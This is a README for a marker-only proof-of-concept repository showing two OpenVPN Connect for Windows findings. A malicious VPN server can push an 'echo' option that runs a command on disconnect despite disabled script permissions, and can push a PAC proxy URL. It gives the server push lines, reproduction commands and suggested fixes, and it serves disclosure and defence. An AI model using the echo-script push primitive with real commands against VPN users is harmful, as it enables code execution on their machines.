# OpenVPN Connect Server-Pushed Option Findings PoC

Benign proof of concept bundle for two locally verified OpenVPN Connect for Windows behaviors reachable from a malicious VPN server after a victim imports and connects to an `.ovpn` profile.

This repository is intentionally marker-only. It does not use PowerShell, pop calc, install persistence, read credentials, modify protected files, or start a reverse shell.

## Findings

### Finding 1: Echo Script Permission Bypass to Current-User ACE

A malicious OpenVPN server can push an `echo` option that decodes into `script.win.user.disconnect`. OpenVPN Connect later executes that command on disconnect even though the imported profile's script permission state remains unset or false.

Server primitive:

```text
push "echo 0:0:<base64(script.win.user.disconnect)>.<base64(command)>"
```

Verified impact:

- Current-user arbitrary command execution on VPN disconnect.
- Import alone is not enough. The client must connect, receive the pushed `echo` value, and then disconnect.
- The default payload writes `%TEMP%\openvpn_connect_echo_script_ace_marker.txt`.

Observed permission state during local verification:

```text
scriptsPermissionGranted=false
scriptsPermissionLocked=false
```

### Finding 2: Server-Pushed PAC Auto-Config State Control

A malicious OpenVPN server can push `dhcp-option PROXY_AUTO_CONFIG_URL`. OpenVPN Connect passes the pushed PAC URL through the privileged `/tun-setup` path, and the LocalSystem agent applies the proxy action by impersonating the current user. During the VPN session, HKCU Internet Settings receives the server-controlled `AutoConfigURL`; OpenVPN Connect clears it on disconnect.

Server primitive:

```text
push "dhcp-option PROXY_AUTO_CONFIG_URL http://127.0.0.1:18080/openvpn-connect-ace.pac"
```

Verified impact:

- Server-controlled PAC URL is applied while connected.
- The state change is transient and is cleaned up on disconnect in the tested build.
- This is not a SYSTEM shell. It is a separate server-controlled client state modification through the privileged OpenVPN Connect helper path.

Registry state observed in local verification:

```text
Before connect: AutoConfigURL=null, ProxyEnable=0
During connect: AutoConfigURL=http://127.0.0.1:18080/openvpn-connect-poc.pac, ProxyEnable=0
After disconnect: AutoConfigURL=null, ProxyEnable=0
```

Relevant log indicators:

```text
0 [dhcp-option] [PROXY_AUTO_CONFIG_URL] [http://127.0.0.1:18080/openvpn-connect-poc.pac]
/tun-setup proxy_auto_config_url.url=http://127.0.0.1:18080/openvpn-connect-poc.pac
ProxyAction: auto config: http://127.0.0.1:18080/openvpn-connect-poc.pac
```

## Tested Target

- OpenVPN Connect for Windows `3.8.0 (4528)`
- OpenVPN core `3.11.3`
- Windows desktop target

Follow-up local checks also showed that code running as the current user inside the genuine `OpenVPNConnect.exe` process can reach LocalSystem helper/agent named-pipe handlers that reject arbitrary external clients. That is useful escalation context for impact analysis, but it is not presented here as standalone SYSTEM RCE.

## Repository Layout

```text
.
|-- README.md
|-- poc.py
|-- certs/
|   |-- ca.crt
|   |-- server.crt
|   |-- server.key
|   |-- client.crt
|   `-- client.key
`-- runtime/
```

`runtime/` is generated locally and git-ignored. The certificates are throwaway lab material only. Do not reuse them for a real VPN.

## Requirements

- Python 3.9+
- OpenVPN 2.x community binary for the local test server
- OpenVPN Connect installed on the Windows target

The PoC uses Python and `cmd.exe` only. There is no `.ps1` runner.

If `openvpn.exe` is not on `PATH`, pass it explicitly:

```cmd
python poc.py --mode server --openvpn "C:\Program Files\OpenVPN\bin\openvpn.exe"
```

## Quick Start

Build the echo-script ACE configs:

```cmd
python poc.py --mode build --finding echo-script
```

Build the PAC auto-config configs:

```cmd
python poc.py --mode build --finding proxy-auto-config
```

Generated files are written under `runtime/`. The client `.ovpn` file is the profile to import into OpenVPN Connect. The server `.ovpn` file is used by the local malicious OpenVPN 2.x test server.

## Manual Reproduction: Echo Script ACE

Start the local malicious server:

```cmd
python poc.py --mode server --finding echo-script --openvpn "C:\Program Files\OpenVPN\bin\openvpn.exe"
```

Then:

1. Import `runtime\client_echo_script_poc.ovpn` into OpenVPN Connect.
2. Connect to the imported `127.0.0.1` profile.
3. Disconnect normally.
4. Check the marker path printed by `poc.py`.

Expected marker content:

```text
OPENVPN_CONNECT_ECHO_SCRIPT_ACE
```

## Manual Reproduction: PAC Auto-Config

Start the local malicious server:

```cmd
python poc.py --mode server --finding proxy-auto-config --openvpn "C:\Program Files\OpenVPN\bin\openvpn.exe"
```

Then:

1. Import `runtime\client_proxy_auto_config_poc.ovpn` into OpenVPN Connect.
2. Connect to the imported `127.0.0.1` profile.
3. While connected, inspect the PAC registry value:

   ```cmd
   reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v AutoConfigURL
   ```

4. Disconnect normally.
5. Query the same value again and confirm cleanup.

Expected during connection:

```text
AutoConfigURL    REG_SZ    http://127.0.0.1:18080/openvpn-connect-ace.pac
```

Expected after disconnect:

```text
ERROR: The system was unable to find the specified registry key or value.
```

## Automated Local Reproduction

Echo-script ACE:

```cmd
python poc.py --mode auto --finding echo-script --openvpn "C:\Program Files\OpenVPN\bin\openvpn.exe"
```

PAC auto-config:

```cmd
python poc.py --mode auto --finding proxy-auto-config --openvpn "C:\Program Files\OpenVPN\bin\openvpn.exe"
```

If OpenVPN Connect is installed elsewhere:

```cmd
python poc.py --mode auto --finding echo-script --openvpn "C:\Program Files\OpenVPN\bin\openvpn.exe" --connect "C:\Program Files\OpenVPN Connect\OpenVPNConnect.exe"
```

`auto` mode imports a disposable profile, connects, captures the relevant marker or proxy state, disconnects, removes the profile, and quits the test-launched Connect process.

## Evidence To Capture

For Finding 1:

- Generated `runtime\server.ovpn` push line containing `echo 0:0:`.
- OpenVPN Connect log line showing `0 [echo] [0:0:...]`.
- Marker file `%TEMP%\openvpn_connect_echo_script_ace_marker.txt`.
- Profile state showing script permissions unset or false.

For Finding 2:

- Generated `runtime\server.ovpn` push line containing `dhcp-option PROXY_AUTO_CONFIG_URL`.
- OpenVPN Connect log line showing `0 [dhcp-option] [PROXY_AUTO_CONFIG_URL]`.
- `/tun-setup` log data containing `proxy_auto_config_url.url`.
- Agent log line showing `ProxyAction: auto config`.
- HKCU Internet Settings `AutoConfigURL` before connect, during connect, and after disconnect.

## Limits

This PoC does not prove SYSTEM RCE, silent local privilege escalation, persistence, credential access, arbitrary protected-file write, service tampering, or reverse shell execution.

Finding 1 proves current-user command execution from a malicious server-controlled option on disconnect.

Finding 2 proves server-controlled PAC state while connected. Depending on product design and user consent expectations, this may be treated as intended VPN server functionality, a missing visibility/consent issue, or an abuse primitive that matters when chained with the trusted-client helper boundary.

## Fix Direction

For Finding 1:

- Do not execute decoded `script.*` echo data unless the corresponding profile script permission flag is explicitly granted.
- Treat server-pushed script-bearing `echo` data as executable configuration.
- Prompt before enabling or running any script received from a VPN server.
- Reject or ignore pushed script keys when profile policy disallows scripts.
- Add regression coverage for `script.win.user.disconnect` where `scriptsPermissionGranted=false`.

For Finding 2:

- Make server-pushed proxy/PAC state visible before or during connection.
- Provide policy controls to reject server-pushed proxy configuration from untrusted profiles.
- Ensure cleanup is reliable across disconnect, crash, reconnect, sleep, and agent restart cases.
- Log the origin of the server-pushed PAC URL clearly enough for incident review.

## Responsible Use

Use this only on systems you own or are explicitly authorized to test. Keep public demonstrations benign.
